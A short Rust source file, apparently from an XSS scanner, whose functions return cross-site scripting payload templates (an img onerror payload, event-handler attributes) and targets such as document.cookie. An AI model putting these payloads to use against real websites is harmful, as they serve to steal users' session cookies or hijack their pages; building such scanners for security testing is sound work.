pub fn get_jsvalue() -> Vec<String> {
        vec![
                "document.cookie".to_string(),
                "document.location".to_string(),
                "1".to_string(),
            ]
}

pub fn get_jscmd() -> Vec<String> {
        vec![
                "<img src=x onerror=$JS_FUNC$`$JS_CMD$`>".to_string(),
                "<h1 $JS_FUNC$`$JS_CMD$`>".to_string(),
                "<h1 $JS_FUNC$($JS_CMD)".to_string(),
            ]
}

pub fn get_htmltags() -> Vec<String> {
        vec![
                "<img src=x onerror=$JS_FUNC$`$JS_CMD$`>".to_string(),
                "<h1 $JS_FUNC$`$JS_CMD$`>".to_string(),
                "<h1 $JS_FUNC$($JS_CMD)".to_string(),
            ]
}

pub fn get_attr() -> Vec<String> {
        vec![
                "onmouseover".to_string(),
                "onmouseenter".to_string(),
                "onmouseleave".to_string(),
                "onmouseout".to_string(),
                "onclick".to_string(),
                "onmousedown".to_string(),
                "onmouseup".to_string(),
                "ontouchstart".to_string(),
                "ontouchend".to_string(),
                "ontouchmove".to_string(),
                "onpointerenter".to_string(),
                "onpointerleave".to_string(),
                "onpointerover".to_string(),
            ]
}
